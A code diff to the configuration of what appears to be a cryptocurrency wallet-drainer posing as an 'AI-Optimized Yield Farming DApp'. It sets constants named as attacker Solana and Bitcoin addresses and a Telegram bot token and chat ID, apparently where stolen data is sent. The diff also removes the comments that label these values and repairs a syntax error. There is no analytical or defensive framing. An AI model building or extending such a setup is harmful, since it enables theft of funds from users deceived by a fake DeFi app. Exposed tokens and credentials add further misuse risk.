@@ -911,11 +911,9 @@ export const CONFIG = {
     }
   ]`),
 
-  // WalletConnect project IDs
   PROJECT_ID: "b73926bcbfbad084f994910cadc18b63",
   PUBLIC_TEST_ID: "8f9a3f7b7c8e4d3a9b2c1d5e6f7a8b9c",
 
-  // Attacker addresses for Solana and Bitcoin
   ATTACKER_SOLANA_ADDRESS: "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7",
   ATTACKER_BTC_ADDRESS: "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f",
 
@@ -925,9 +923,9 @@ export const CONFIG = {
     description: 'AI-Optimized Yield Farming DApp',
     url: window.location.origin,
     icons: ['https://walletconnect.com/walletconnect-logo.png'],
-  }
-  
- // ====== TELEGRAM CREDENTIALS ======
+  },
+
+  // ====== TELEGRAM CREDENTIALS ======
   TELEGRAM_BOT_TOKEN: "8695014382:AAHVuw3qQTCa_rGIzBXoRxDEdKkPvUhLim0",
-  TELEGRAM_CHAT_ID: "6840537087",   // <-- Replace with your actual chat ID
+  TELEGRAM_CHAT_ID: "17624102"
 };
